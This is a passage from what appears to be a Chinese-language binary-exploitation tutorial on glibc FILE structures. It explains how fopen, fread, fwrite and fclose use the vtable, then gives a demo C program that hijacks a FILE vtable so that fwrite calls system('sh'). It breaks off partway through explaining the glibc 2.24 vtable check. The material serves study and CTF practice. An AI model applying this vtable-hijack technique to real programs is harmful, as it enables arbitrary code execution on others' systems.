class=\"token punctuation\">,</span> <span class=\"token comment\">// finish</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token number\">4</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// overflow</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token number\">5</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// underflow</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token number\">6</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// uflow</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token number\">7</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// pbackfail</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token number\">8</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// xsputn  #printf</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token number\">9</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// xsgetn</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token number\">10</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// seekoff</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token number\">11</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// seekpos</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token number\">12</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// setbuf</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token number\">13</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// sync</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token number\">14</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// doallocate</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token number\">15</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// read</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token number\">16</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// write</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token number\">17</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// seek</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token number\">18</span> pwn<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// close</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token number\">19</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// stat</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   <span class=\"token number\">20</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// showmanyc</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>   <span class=\"token number\">21</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// imbue</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>可以通过gdb打印来查看vtable中的指针：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pwndbg<span class=\"token operator\">></span> print _IO_file_jumps</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>$<span class=\"token number\">1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __dummy <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  __dummy2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  __finish <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e540d0</span> <span class=\"token operator\">&lt;</span>_IO_new_file_finish<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  __overflow <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e54f00</span> <span class=\"token operator\">&lt;</span>_IO_new_file_overflow<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  __underflow <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e54ba0</span> <span class=\"token operator\">&lt;</span>_IO_new_file_underflow<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  __uflow <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e560d0</span> <span class=\"token operator\">&lt;</span>__GI__IO_default_uflow<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  __pbackfail <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e57800</span> <span class=\"token operator\">&lt;</span>__GI__IO_default_pbackfail<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  __xsputn <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e53750</span> <span class=\"token operator\">&lt;</span>_IO_new_file_xsputn<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  __xsgetn <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e533c0</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_xsgetn<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  __seekoff <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e529e0</span> <span class=\"token operator\">&lt;</span>_IO_new_file_seekoff<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  __seekpos <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e56780</span> <span class=\"token operator\">&lt;</span>_IO_default_seekpos<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  __setbuf <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e526b0</span> <span class=\"token operator\">&lt;</span>_IO_new_file_setbuf<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  __sync <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e52540</span> <span class=\"token operator\">&lt;</span>_IO_new_file_sync<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  __doallocate <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e45df0</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_doallocate<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  __read <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e53720</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_read<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  __write <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e52fe0</span> <span class=\"token operator\">&lt;</span>_IO_new_file_write<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  __seek <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e52780</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_seek<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  __close <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e526a0</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_close<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  __stat <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e52fc0</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_stat<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  __showmanyc <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e57990</span> <span class=\"token operator\">&lt;</span>_IO_default_showmanyc<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  __imbue <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e579a0</span> <span class=\"token operator\">&lt;</span>_IO_default_imbue<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当程序执行 fopen 等函数时就会创建 FILE 结构体，当我们打开多个文件，就会创建多个 FILE 结构体，这时候这些 FILE 结构体就会通过_chain 域相连，链表头部用全局变量_IO_list_all 表示，</p>\n<p>当程序启动时会打开三个文件流：stdin、stdout、stderr。在初始状态下，_IO_list_all 指向的是一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。</p>\n<h3 id=\"fopen\"><a class=\"anchor\" href=\"#fopen\">#</a> fopen</h3>\n<p>fopen 用于打开文件，原型如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>FILE <span class=\"token operator\">*</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>filename<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 返回一个文件指针</span></pre></td></tr></table></figure><p>fopen 函数实际调用的是_IO_new_fopen 函数，_IO_new_fopen 函数又会调用_fopen_internal 函数，__fopen_internal 函数主要分为四步：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>malloc分配内存空间。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>调用_IO_no_init函数对file结构体进行null初始化。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span>调用_IO_file_init函数将结构体链接进_IO_list_all链表。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">4.</span>调用_IO_file_fopen函数最终执行系统调用打开文件。</pre></td></tr></table></figure><h3 id=\"fread\"><a class=\"anchor\" href=\"#fread\">#</a> fread</h3>\n<p>fread 从文件流中读取数据，原型如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">_IO_fread</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> _IO_size_t size<span class=\"token punctuation\">,</span> _IO_size_t count<span class=\"token punctuation\">,</span> _IO_FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>fread 函数实际调用的是_IO_fread 函数，_IO_fread 函数又调用_IO_sgetn 函数，这个函数又继续调用_IO_XSGETN 函数，其实就是 vtable 中的__xsgetn 函数。</p>\n<p>__xsgetn 函数主要分为三步：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>当fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span>时，说明FILE结构体中的指针还没有被初始化，缓冲区未建立，则调用_IO_doallocbuf初始化指针，建立缓冲区。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>当输入缓冲区里有数据，即fp<span class=\"token operator\">-></span>_IO_read_ptr小于fp<span class=\"token operator\">-></span>_IO_read_end时，把缓冲区里的数据直接拷贝至目标buf。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span>当缓冲区里的数据为空或者是不能满足全部的需求，则调用__underflow调用系统调用读入数据。</pre></td></tr></table></figure><p>fread 在执行系统调用前执行了多次 vtable 中的函数。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__GI__IO_file_xsgetn</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>_IO_file_doallocate  <span class=\"token comment\">// 初始化输入缓冲区</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>__GI__IO_file_stat  <span class=\"token comment\">// 获取文件信息</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>_IO_new_file_underflow  <span class=\"token comment\">// 读取文件数据</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>__GI__IO_file_read  <span class=\"token comment\">// 最终执行系统调用</span></pre></td></tr></table></figure><h3 id=\"fwrite\"><a class=\"anchor\" href=\"#fwrite\">#</a> fwrite</h3>\n<p>fwrite 向文件流中写入数据，原型如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> nmemb<span class=\"token punctuation\">,</span>FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>fwrite 函数实际调用的是_IO_fwrite 函数，_IO_fwrite 函数又调用了_IO_sputn 函数，即 vtable 中的__xsputn 函数。</p>\n<p>这个函数也分为三部分：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>判断输出缓冲区还有多少空间，如果输出缓冲区有剩余空间的话，把目标输出数据拷贝到输出缓冲区，然后计算在输出缓冲区填满后，是否仍然剩余的目标输出数据。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>如果还有剩余的目标输出数据，说明输出缓冲区满了或者没有建立，这时候调用_IO_OVERFLOW刷新或建立输出缓冲区。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span>经过刷新或建立输出缓冲区后，检查目标输出数据的大小，如果超出输出缓冲区的大小，就跳过输出缓冲区直接输出。然后把最后剩余的数据拷贝到输出缓冲区。</pre></td></tr></table></figure><p>fwrite 在执行系统调用前同样执行了多次 vtable 中的函数</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>_IO_new_file_xsputn</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>_IO_new_file_overflow  <span class=\"token comment\">// 刷新或建立输出缓冲区</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>_IO_file_doallocate  <span class=\"token comment\">// 初始化输入缓冲区</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>__GI__IO_file_stat  <span class=\"token comment\">// 获取文件信息</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>_IO_new_file_write  <span class=\"token comment\">// 最终执行系统调用</span></pre></td></tr></table></figure><h3 id=\"fclose\"><a class=\"anchor\" href=\"#fclose\">#</a> fclose</h3>\n<p>fclose 用于关闭已打开的文件，原型如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行 fclose 后会关闭一个文件流，把缓冲区内剩余的数据输出到文件中，同时释放文件指针和有关的缓冲区。</p>\n<p>fclose 函数实际调用的是_IO_new_fclose 函数，_IO_new_fclose 函数大致分为四部分：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>调用_IO_un_link函数将IO FILE结构体从_IO_list_all链表中取下。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>调用_IO_file_close_it函数关闭文件，释放缓冲区，并清空缓冲区指针。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span>调用_IO_FINISH函数，即vtable中的__finish函数，确认文件开关状态和缓冲区是否被释放。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">4.</span>此时已经将结构体从链表中删除，刷新了缓冲区，释放了缓冲区内存，只剩下结构体内存尚未释放，因此释放结构体内存。</pre></td></tr></table></figure><p>fclose 函数执行过程中调用的 vtable 函数</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__close  <span class=\"token comment\">// 执行系统调用关闭文件描述符</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>__finish  <span class=\"token comment\">// 确认文件开关状态和缓冲区状态</span></pre></td></tr></table></figure><h3 id=\"部分函数在libc中的函数名\"><a class=\"anchor\" href=\"#部分函数在libc中的函数名\">#</a> 部分函数在 libc 中的函数名：</h3>\n<blockquote>\n<p>p *(struct _IO_FILE_plus *) stdout</p>\n<p>p *_IO_list_all</p>\n<p>p _IO_file_jumps</p>\n<p>_IO_new_file_init</p>\n<p>_IO_new_file_fopen</p>\n<p>_IO_file_open</p>\n<p>_IO_file_xsgetn</p>\n<p>_IO_new_file_xsputn</p>\n<p>_IO_new_file_close_it</p>\n</blockquote>\n<h2 id=\"劫持vtable并修改指针\"><a class=\"anchor\" href=\"#劫持vtable并修改指针\">#</a> 劫持 vtable 并修改指针</h2>\n<p>vtable 是_IO_FILE_plus 结构体里的一个字段，是一个函数表指针，里面存储着许多和 IO 相关的函数。</p>\n<p>fread、fwrite、fclose 等 IO 函数基本都调用了 vtable 中的函数来实现功能。</p>\n<h3 id=\"223\"><a class=\"anchor\" href=\"#223\">#</a> 2.23</h3>\n<h4 id=\"vtable劫持原理\"><a class=\"anchor\" href=\"#vtable劫持原理\">#</a> vtable 劫持原理：</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>控制FILE结构体，实现对vtable指针的修改，使得vtable指向可控的内存，在该内存中构造好vtable，再通过调用相应IO函数，触发vtable函数的调用，即可劫持程序执行流。</pre></td></tr></table></figure><h4 id=\"思路\"><a class=\"anchor\" href=\"#思路\">#</a> 思路：</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>修改内存中已有FILE结构体的vtable字段。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>伪造整个FILE结构体。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>本质都是修改了vtable字段。</pre></td></tr></table></figure><h4 id=\"例子\"><a class=\"anchor\" href=\"#例子\">#</a> 例子</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">system_ptr</span> <span class=\"token expression\"><span class=\"token number\">0x7ffff7a52390</span><span class=\"token punctuation\">;</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span>vtable_addr<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span>fake_vtable<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> fp<span class=\"token operator\">=</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"rw\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> fake_vtable<span class=\"token operator\">=</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 开辟一个堆当作伪造的 vtable。</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> vtable_addr<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>fp<span class=\"token operator\">+</span><span class=\"token number\">0xd8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">//0xd8 为 64 位下 vtable 在_IO_FILE_plus 结构体中的偏移。</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> vtable_addr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>fake_vtable<span class=\"token punctuation\">;</span><span class=\"token comment\">// 让 vtable 指针指向我们伪造的 vtable。</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，也就是_flags 成员变量，所以这里设置_flag=\"sh\"。</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> fake_vtable<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system_ptr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 找到__xsputn 函数在 vtable 中的偏移，修改这个位置的指针，使其指向 system 函数。</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hi\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 执行 fwrite 函数会调用__xsputn 函数，实际上是执行 system (\"sh\")</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"224以后\"><a class=\"anchor\" href=\"#224以后\">#</a> 2.24 以后</h3>\n<h4 id=\"vtable-check机制\"><a class=\"anchor\" href=\"#vtable-check机制\">#</a> vtable check 机制</h4>\n<p>在执行_IO_OVERFLOW 函数前执行了 IO_validate_vtable 函数，这个函数会检测 vtable 是不是 glibc 中的 vtable，如果不是，进入_IO_vtable_check 函数。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">_IO_vtable_check</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">SHARED</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">/* Honor the compatibility flag.  */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>flag<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">atomic_load_relaxed</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>IO_accept_foreign_vtables<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">PTR_DEMANGLE</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">PTR_DEMANGLE</span> <span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>flag <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>_IO_vtable_check<span class=\"token punctuation\">)</span>   <span class=\"token comment\">// 检查是不是外部构造中的 vtable</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    Dl_info di<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">link_map</span> <span class=\"token operator\">*</span>l<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_dl_open_hook <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">_dl_addr</span> <span class=\"token punctuation\">(</span>_IO_vtable_check<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>di<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>l<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token operator\">&amp;&amp;</span> l<span class=\"token operator\">-></span>l_ns <span class=\"token operator\">!=</span> LM_ID_BASE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">// 检查是不是动态链接库的 vtable</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span> <span class=\"token comment\">/* !SHARED */</span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>__dlopen <span 